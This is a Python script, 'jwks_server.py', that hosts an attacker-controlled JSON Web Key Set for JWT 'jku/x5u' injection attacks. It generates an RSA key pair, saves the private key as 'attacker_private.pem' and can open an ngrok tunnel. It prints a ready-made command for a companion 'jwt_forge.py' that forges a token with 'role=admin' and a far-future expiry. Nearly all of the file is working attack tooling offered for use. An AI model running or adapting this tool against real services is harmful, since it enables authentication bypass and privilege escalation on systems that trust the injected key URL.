#!/usr/bin/env python3
"""
jwks_server.py — Serve a JWKS for jku/x5u injection attacks

Starts an HTTP server that responds to any path with a JWKS containing
your attacker-controlled RSA public key. Use alongside jwt_forge.py.

Usage:
  python3 jwks_server.py --port 8080
  python3 jwks_server.py --port 8080 --ngrok   # auto-start ngrok tunnel

Requirements: pip install cryptography
Optional:     pip install pyngrok (for --ngrok)
"""

import argparse
import base64
import http.server
import json
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer


def b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def int_to_b64(n: int) -> str:
    length = (n.bit_length() + 7) // 8
    return b64e(n.to_bytes(length, "big"))


def generate_key_pair():
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import serialization
        import secrets
    except ImportError:
        print("Install cryptography: pip install cryptography")
        sys.exit(1)

    private_key = rsa.generate_private_key(
        public_exponent=65537, key_size=2048, backend=default_backend()
    )
    public_key = private_key.public_key()
    pub_numbers = public_key.public_numbers()
    kid = secrets.token_hex(8)

    jwks = {
        "keys": [{
            "kty": "RSA",
            "kid": kid,
            "use": "sig",
            "alg": "RS256",
            "n": int_to_b64(pub_numbers.n),
            "e": int_to_b64(pub_numbers.e),
        }]
    }

    priv_pem = private_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption(),
    )

    return jwks, priv_pem, kid


class JWKSHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps(self.server.jwks, indent=2).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        print(f"[JWKS] {self.address_string()} → {fmt % args}")


def main():
    parser = argparse.ArgumentParser(description="jwks_server — JWKS host for jku injection")
    parser.add_argument("--port", type=int, default=8080)
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--ngrok", action="store_true", help="Create ngrok tunnel for public URL")
    parser.add_argument("--save-key", default="attacker_private.pem", help="Save private key to file")
    args = parser.parse_args()

    jwks, priv_pem, kid = generate_key_pair()

    with open(args.save_key, "wb") as f:
        f.write(priv_pem)

    server = HTTPServer((args.host, args.port), JWKSHandler)
    server.jwks = jwks

    public_url = f"http://YOUR_IP:{args.port}/jwks.json"

    if args.ngrok:
        try:
            from pyngrok import ngrok
            tunnel = ngrok.connect(args.port)
            public_url = f"{tunnel.public_url}/jwks.json"
        except ImportError:
            print("[!] pyngrok not installed: pip install pyngrok")
            print("    Continuing without tunnel...")

    print(f"""
[*] JWKS Server Ready
    kid           : {kid}
    Private key   : {args.save_key}
    Local URL     : http://localhost:{args.port}/jwks.json
    Public URL    : {public_url}

[*] Forge a token with jku injection:
    python3 jwt_forge.py <original_token> --attack jku \\
      --jku-url {public_url} \\
      --set role=admin exp=9999999999

[*] Waiting for connections... (Ctrl+C to stop)
""")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopped.")


if __name__ == "__main__":
    main()
